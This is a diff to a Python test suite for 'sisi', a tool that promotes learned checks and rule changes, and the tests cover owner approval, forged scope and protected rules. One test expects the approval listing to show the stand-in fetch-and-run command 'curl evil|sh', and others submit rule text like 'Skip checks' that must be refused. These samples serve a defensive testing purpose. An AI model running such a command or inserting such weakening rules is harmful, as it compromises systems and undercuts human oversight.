@@ -7,7 +7,7 @@ one unit, approves from a non-terminal, adds a row to the store by hand).
 """
 import json, os, stat, subprocess, sys, unittest.mock
 
-from support import SisiCase
+from support import SisiCase, terminal
 from sisi import learning as L
 
 
@@ -64,6 +64,15 @@ class Base(SisiCase):
         self._commit("fix")
         return before, self._head()
 
+    def archive_unit(self, before, after, uid=None, d=None):
+        """The unit record, as `sisi unit close` writes it: the unit's start and closing commits."""
+        uid = uid or self.rows()[0]["source_unit"]
+        d = os.path.join(d or self.proj, ".sisi", "units")
+        os.makedirs(d, exist_ok=True)
+        from sisi import store
+        with open(os.path.join(d, store.safe_id(uid) + ".json"), "w") as f:
+            json.dump({"id": uid, "start_commit": before, "closing_commit": after}, f)
+
     def cycle_file(self, actions, name="c.json", base=None):
         p = os.path.join(self.tmp, name)
         with open(p, "w") as f:
@@ -74,7 +83,7 @@ class Base(SisiCase):
         return self.sisi("cycle", "apply", self.cycle_file(actions, **kw))
 
     def tty(self):
-        return unittest.mock.patch("sisi.cycle._stdin_is_tty", return_value=True)
+        return terminal()
 
     def other_project(self, name="other"):
         d = os.path.join(self.tmp, name)
@@ -100,6 +109,18 @@ class Base(SisiCase):
                        "--disposition", "record", "--limits", "here", "--same-as", lid, cwd=other)
         self.assertEqual(r.returncode, 0, r.stderr)
         return other
+
+    def another(self, n):
+        """A further proposed learning (L-000n), recorded as its own (--new) with words of its own."""
+        word = ("alpha bravo charlie delta echo foxtrot golf hotel india juliet kilo lima mike november oscar papa "
+                "quebec romeo sierra tango").split()[n]
+        r = self.retro("--new", "--finding", "the %s importer dropped %s rows in the nightly run" % (word, 10 + n),
+                       "--cause", "no fixture covered the %s case" % word, "--impact", "correctness",
+                       "--disposition", "promote", "--change", "add a %s fixture to the importer tests" % word,
+                       "--mechanism", "verification", "--expect", "the %s case is caught" % word,
+                       "--validate", "run the %s fixture" % word)
+        self.assertEqual(r.returncode, 0, r.stderr)
+        return self.rows()[-1]["id"]
 
     def set_config(self, cfg):
         os.makedirs(self.data, exist_ok=True)
@@ -185,10 +206,11 @@ class Retro(Base):
         """R-11.5-6, R-11.5-8 (item 13): the status field itself says validated / monitored."""
         before, after = self.fixed_repo()
         self.retro(*PROMOTE[1:])
-        # a validated command that waits for the owner is `validated`, not `promoted`
+        self.archive_unit(before, after)
+        # a validated command that waits for the owner is `pending-approval`, not `promoted`
         self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "command-check",
-                     "cmd": "grep -q fixed f.txt", "before": before, "after": after, "scope": "user"}])
-        self.assertEqual(self.rows()[0]["status"], "validated")
+                     "cmd": "grep -q fixed f.txt", "scope": "user"}])
+        self.assertEqual(self.rows()[0]["status"], "pending-approval")
         self.assertEqual(self.rows()[0]["validation"]["result"], "validated")
         # a promoted learning becomes `monitored` once a unit in its scope has closed since
         self.retro("--finding", "another unrelated slowness appeared in the test run today",
@@ -316,9 +338,12 @@ class Replay(Base):
     fix and ran and passed after it, in the learning's own trusted repository."""
 
     def promote_cmd(self, cmd, before, after, **kw):
+        """Record the learning, give its unit record the two commits, then apply a command check.
+        The commits come from the record; anything the cycle file says about them is ignored."""
         self.retro(*PROMOTE[1:])
-        a = {"action": "promote", "learning": "L-0001", "mechanism_kind": "command-check",
-             "cmd": cmd, "before": before, "after": after}
+        if before and after:
+            self.archive_unit(before, after, uid=self.rows()[0]["source_unit"])
+        a = {"action": "promote", "learning": "L-0001", "mechanism_kind": "command-check", "cmd": cmd}
         a.update(kw)
         return self.apply([a])
 
@@ -422,8 +447,10 @@ class Replay(Base):
         r = self.promote_cmd("grep -q fixed f.txt", before, after)
         self.assert_unvalidated(r, "trust")
 
-    def test_repo_chosen_by_the_author_must_be_the_learnings_project(self):
-        """The cycle file names a different (trusted) repository: it is not the learning's origin."""
+    def test_repo_and_commits_named_by_the_author_are_ignored(self):
+        """R-11.6-3, R-16-7: the cycle file names another (trusted) repository and its own two
+        commits; the replay uses the learning's own record, so a command that only passes there
+        is not validated here."""
         from sisi import trust
         before, after = self.fixed_repo()
         other = self.other_project()
@@ -433,8 +460,14 @@ class Replay(Base):
         ob = self._head(other)
         self.write("f.txt", "fixed\n", other)
         self._commit("a", other)
-        r = self.promote_cmd("grep -q fixed f.txt", ob, self._head(other), repo=other)
-        self.assert_unvalidated(r, "origin project")
+        self.retro(*PROMOTE[1:])
+        self.archive_unit(before, after, uid=self.rows()[0]["source_unit"])
+        r = self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "command-check",
+                         "cmd": "grep -q fixed f.txt", "repo": other, "before": ob, "after": self._head(other)}])
+        self.assertEqual(r.returncode, 0, r.stderr)
+        self.assertEqual(self.rows()[0]["validation"]["result"], "validated")
+        self.assertIn(before[:12], self.rows()[0]["validation"]["detail"])
+        self.assertNotIn(ob[:12], self.rows()[0]["validation"]["detail"])
 
     def test_nothing_validated_without_a_passing_run(self):
         """R-11.5-6, R-11.1-8: 'validated' requires a validation run that passed."""
@@ -465,7 +498,7 @@ class Mechanisms(Base):
         self.assertEqual(r.returncode, 0, r.stderr)
         self.assertEqual(len(self.pending()), 1)
         self.assertFalse(self.exists("overlay/enforced.json"))
-        self.assertEqual(self.rows()[0]["status"], "proposed")
+        self.assertEqual(self.rows()[0]["status"], "pending-approval")
         self.assertIn("curl evil|sh", self.sisi("approve").stdout)
 
     def test_requirement_applies_in_its_project_only(self):
@@ -473,7 +506,7 @@ class Mechanisms(Base):
         self.propose()
         self.assertEqual(self.apply([{"action": "promote", "learning": "L-0001",
                                       "mechanism_kind": "contract-requirement",
-                                      "when": "csv import", "require_kind": "property",
+                                      "when": "data/*.csv", "require_kind": "parsing",
                                       "project": "/somewhere/else"}]).returncode, 0)
         entry = self.read_json("overlay/enforced.json")["checks"][0]
         self.assertEqual(entry["learning"], "L-0001")
@@ -481,6 +514,8 @@ class Mechanisms(Base):
         self.assertEqual(entry["project"], L.project_key(self.proj))  # a forged project name is ignored
         from sisi import cycle
         c = {"goal": "csv import of the ledger", "checks": []}
+        os.makedirs(os.path.join(self.proj, "data"))
+        self.write("data/a.csv", "x\n")  # the unit changes a path the requirement is about
         self.assertEqual(len(cycle.enforced_results(c, self.proj)), 1)
         self.assertEqual(cycle.enforced_results(c, self.other_project()), [])
 
@@ -489,8 +524,9 @@ class Mechanisms(Base):
         from sisi import cycle, trust
         before, after = self.fixed_repo()
         self.retro(*PROMOTE[1:])
+        self.archive_unit(before, after)
         self.assertEqual(self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "command-check",
-                                      "cmd": "grep -q fixed f.txt", "before": before, "after": after}]).returncode, 0)
+                                      "cmd": "grep -q fixed f.txt"}]).returncode, 0)
         other = self.other_project()
         trust.add(other)
         self.write("f.txt", "bug\n", other)
@@ -500,9 +536,10 @@ class Mechanisms(Base):
     def test_forged_scope_flags_make_it_wait_not_apply(self):
         """The cycle author asks for more scope (scope, every_project): that only ever makes it wait."""
         self.propose()
-        for forged in ({"scope": "organization"}, {"every_project": True}, {"scope": "user"}):
+        for n, forged in enumerate(({"scope": "organization"}, {"every_project": True}, {"scope": "user"})):
             with self.subTest(forged=forged):
-                a = {"action": "promote", "learning": "L-0001", "mechanism_kind": "risk",
+                lid = "L-0001" if n == 0 else self.another(n)
+                a = {"action": "promote", "learning": lid, "mechanism_kind": "risk",
                      "pattern": "src/**", "profile": "logic"}
                 a.update(forged)
                 before = len(self.pending())
@@ -587,25 +624,48 @@ class Mechanisms(Base):
         self.assertEqual(len(self.pending()), 1)
 
     def test_rule_text_from_one_incident_waits_and_protected_is_refused(self):
-        """R-11.7-2, R-11.5-11: rule text from one project's learning reaches every project, so it
-        waits; replacing an existing rule always waits; a protected rule is refused outright."""
+        """R-11.7-2, R-11.5-11: a sentence added to a rule from one project's learning reaches every
+        project, so it waits; once earned it applies; replacing a whole rule always waits; a protected
+        rule is refused outright."""
         self.propose()
-        rule = "## Check contents {#check-contents}\n\nAssert file contents before delivery.\n\nWhy: a bug shipped.\n"
-        self.assertEqual(self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-text",
-                                      "rule_id": "check-contents", "rule_text": rule}]).returncode, 0)
+        add = {"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-add", "rule_id": "deliver-fast",
+               "add": "Say which check you skipped and why, in the report.",
+               "shortens": "nothing: the rule is one paragraph and every sentence is needed"}
+        self.assertEqual(self.apply([add]).returncode, 0)
         self.assertEqual(len(self.pending()), 1)
-        self.assertFalse(self.exists("overlay/rules/check-contents.md"))
-        self.earn("L-0001")
-        self.assertEqual(self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-text",
-                                      "rule_id": "check-contents", "rule_text": rule}], base=L.store_base()).returncode, 0)
-        self.assertTrue(self.exists("overlay/rules/check-contents.md"))  # earned: an addition applies
+        self.assertEqual(self.rows()[0]["status"], "pending-approval")
+        from sisi import overlay
+        self.assertNotIn("check you skipped", overlay.render())
+        # a decision by the owner makes it a revertible cycle; the sentence is in the loaded rulebook
+        with self.tty():
+            self.assertEqual(self.sisi("approve", "P-0001", "--yes").returncode, 0)
+        self.assertIn("check you skipped", overlay.render())
+        # the sentence went before the rule's Why paragraph
+        body = overlay.render().split("{#deliver-fast}", 1)[1]
+        self.assertLess(body.index("check you skipped"), body.index("Why:"))
+        # earned scope: a second learning that was seen in two units in two projects applies at once
+        second = self.another(1)
+        self.earn(second, finding="the bravo importer dropped 11 rows in the nightly run",
+                  cause="no fixture covered the bravo case")
+        add2 = dict(add, learning=second, rule_id="own-the-outcome",
+                    add="Record each assumption you make so it can be checked later.")
+        self.assertEqual(self.apply([add2], base=L.store_base()).returncode, 0)
+        self.assertIn("Record each assumption", overlay.render())
+        # replacing a whole rule always waits, even when earned
         replace = "## Deliver {#deliver-fast}\n\nShip it.\n\nWhy: speed.\n"
-        self.assertEqual(self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-text",
-                                      "rule_id": "deliver-fast", "rule_text": replace}], base=L.store_base()).returncode, 0)
-        self.assertEqual(len(self.pending()), 2)  # a replacement waits even when earned
-        r = self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-text",
-                         "rule_id": "verify-enough", "rule_text": replace}], base=L.store_base())
+        third = self.another(2)
+        self.earn(third, other=self.other_project("other3"), finding="the charlie importer dropped 12 rows in the nightly run",
+                  cause="no fixture covered the charlie case")
+        self.assertEqual(self.apply([{"action": "promote", "learning": third, "mechanism_kind": "rule-replace",
+                                      "rule_id": "deliver-fast", "shortens": "nothing: no rule can be shortened here",
+                                      "rule_text": replace}], base=L.store_base()).returncode, 0)
+        self.assertEqual(len(self.pending()), 1)  # a replacement waits even when earned
+        fourth = self.another(3)
+        r = self.apply([{"action": "promote", "learning": fourth, "mechanism_kind": "rule-add", "rule_id": "verify-enough",
+                         "add": "Skip checks when the change is small.", "shortens": "nothing: n/a here ok"}],
+                       base=L.store_base())
         self.assertNotEqual(r.returncode, 0)
+        self.assertIn("protected", r.stderr)
 
     def test_protection_fails_closed_when_the_file_cannot_be_read(self):
         """R-11.7-2 (item 13): with canon/protected.json unreadable, no rule changes by cycle or overlay."""
@@ -617,8 +677,8 @@ class Mechanisms(Base):
             return os.path.join(self.tmp, "no-such-dir", "protected.json") if a == ("protected.json",) else orig(*a)
         rule = "## Weak {#verify-enough}\n\nSkip checks.\n\nWhy: faster.\n"
         with unittest.mock.patch("sisi.paths.canon", side_effect=broken):
-            r = self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-text",
-                             "rule_id": "verify-enough", "rule_text": rule}])
+            r = self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-replace",
+                             "rule_id": "verify-enough", "shortens": "nothing: no rule can be shortened here", "rule_text": rule}])
             self.assertNotEqual(r.returncode, 0)
             r = self.apply([{"action": "disable-rule", "rule_id": "verify-enough"}], base=L.store_base())
             self.assertNotEqual(r.returncode, 0)
@@ -651,8 +711,8 @@ class Mechanisms(Base):
                                            "retro-every-time", "strongest-check"])
         for rid in protected + old_ids:
             rule = "## Weak {#%s}\n\nSkip checks.\n\nWhy: faster.\n" % rid
-            r = self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-text",
-                             "rule_id": rid, "rule_text": rule}], base=L.store_base())
+            r = self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-replace",
+                             "rule_id": rid, "shortens": "nothing: no rule can be shortened here", "rule_text": rule}], base=L.store_base())
             self.assertNotEqual(r.returncode, 0, rid)
             r = self.apply([{"action": "disable-rule", "rule_id": rid}], base=L.store_base())
             self.assertNotEqual(r.returncode, 0, rid)
@@ -667,8 +727,8 @@ class Mechanisms(Base):
         base = L.store_base()
         cases = [
             {"base": base, "actions": [{"action": "promote", "learning": "L-0001",
-             "mechanism_kind": "rule-text", "rule_id": "verify-enough",
-             "rule_text": "## Weak {#verify-enough}\n\nSkip checks.\n\nWhy: faster.\n"}]},
+             "mechanism_kind": "rule-replace", "rule_id": "verify-enough",
+             "shortens": "nothing: no rule can be shortened here", "rule_text": "## Weak {#verify-enough}\n\nSkip checks.\n\nWhy: faster.\n"}]},
             {"base": "stale", "actions": [{"action": "promote", "learning": "L-0001",
              "mechanism_kind": "risk", "pattern": "x/**", "profile": "logic"}]},
             {"base": base, "actions": [{"action": "promote", "learning": "L-0001",
@@ -703,7 +763,7 @@ class Mechanisms(Base):
         bad = [{"action": "promote", "learning": "L-0002", "mechanism_kind": "risk",
                 "pattern": "y/**", "profile": "logic"}]
         self.assertNotEqual(self.apply(bad).returncode, 0)
-        good = [{"action": "reject", "learning": "L-0001", "why": "wrong idea"}]
+        good = [{"action": "reject", "learning": "L-0001", "why": "the f.txt content check was replaced by a type check"}]
         self.assertEqual(self.apply(good).returncode, 0)
         self.assertEqual(self.rows()[0]["status"], "rejected")
 
@@ -740,14 +800,11 @@ class Approval(Base):
         """The listing prints the command, the pattern and profile, the rule text diff."""
         self.park_command()
         rule = "## Deliver {#deliver-fast}\n\nShip it at once.\n\nWhy: speed.\n"
-        self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-text",
-                     "rule_id": "deliver-fast", "rule_text": rule},
+        two, three = self.another(1), self.another(2)
+        self.apply([{"action": "promote", "learning": two, "mechanism_kind": "rule-replace",
+                     "rule_id": "deliver-fast", "shortens": "nothing: no rule can be shortened here", "rule_text": rule},
                     ], base=L.store_base())
-        self.retro("--finding", "the release notes template was edited by hand again today",
-                   "--cause", "no generator exists for the notes", "--impact", "time",
-                   "--disposition", "promote", "--change", "generate the notes from the changelog",
-                   "--mechanism", "infrastructure", "--expect", "no hand edits", "--validate", "diff the output")
-        self.apply([{"action": "promote", "learning": "L-0002", "mechanism_kind": "risk",
+        self.apply([{"action": "promote", "learning": three, "mechanism_kind": "risk",
                      "pattern": "src/auth/**", "profile": "trivial"}], base=L.store_base())
         out = self.sisi("approve").stdout
         self.assertIn("make deploy --force-everything", out)
@@ -767,7 +824,7 @@ class Approval(Base):
             self.assertIn("terminal", r.stderr)
         self.assertEqual(len(self.pending()), 1)
         self.assertFalse(self.exists("overlay/enforced.json"))
-        self.assertEqual(L.load_approvals(), [])
+        self.assertEqual([a["decision"] for a in L.load_approvals()], ["refused", "refused"])  # attempts are recorded
 
     def test_a_terminal_decision_is_recorded_with_when_session_and_terminal(self):
         """The record keeps when, the session if known, and that standard input was a terminal."""
@@ -1118,8 +1175,8 @@ class Cycle(Base):
             before = f.read()
         r = self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "risk",
                          "pattern": "f.txt", "profile": "logic"},
-                        {"action": "promote", "learning": "L-0002", "mechanism_kind": "rule-text",
-                         "rule_id": "huge-rule", "rule_text": big}])
+                        {"action": "promote", "learning": "L-0002", "mechanism_kind": "rule-replace",
+                         "rule_id": "huge-rule", "shortens": "nothing: no rule can be shortened here", "rule_text": big}])
         self.assertNotEqual(r.returncode, 0)
         self.assertIn("budget", r.stderr)
         self.assertFalse(self.exists("overlay/risk-adjustments.json"))
@@ -1214,7 +1271,7 @@ class Cycle(Base):
         self.assertEqual(self.rows()[0]["status"], "promoted")
         self.assertEqual(self.sisi("cycle", "revert").returncode, 0)
         self.assertFalse(self.exists("overlay/enforced.json"))
-        self.assertEqual(self.rows()[0]["status"], "proposed")
+        self.assertEqual(self.rows()[0]["status"], "proposed")  # no decision waits for it any more
 
 
 class Migration(Base):
@@ -1412,8 +1469,8 @@ class Product(Base):
         self.assertNotIn("L-0001", self.sisi("rule", "deliver-fast", cwd=self.other_project("o2")).stdout)
         self.earn("L-0001")
         rule = "## Deliver {#deliver-fast}\n\nShip it at once.\n\nWhy: speed.\n"
-        self.assertEqual(self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-text",
-                                      "rule_id": "deliver-fast", "rule_text": rule}]).returncode, 0)
+        self.assertEqual(self.apply([{"action": "promote", "learning": "L-0001", "mechanism_kind": "rule-replace",
+                                      "rule_id": "deliver-fast", "shortens": "nothing: no rule can be shortened here", "rule_text": rule}]).returncode, 0)
         with self.tty():
             self.sisi("approve", "P-0001", "--yes")
         hist = self.sisi("rule", "deliver-fast").stdout
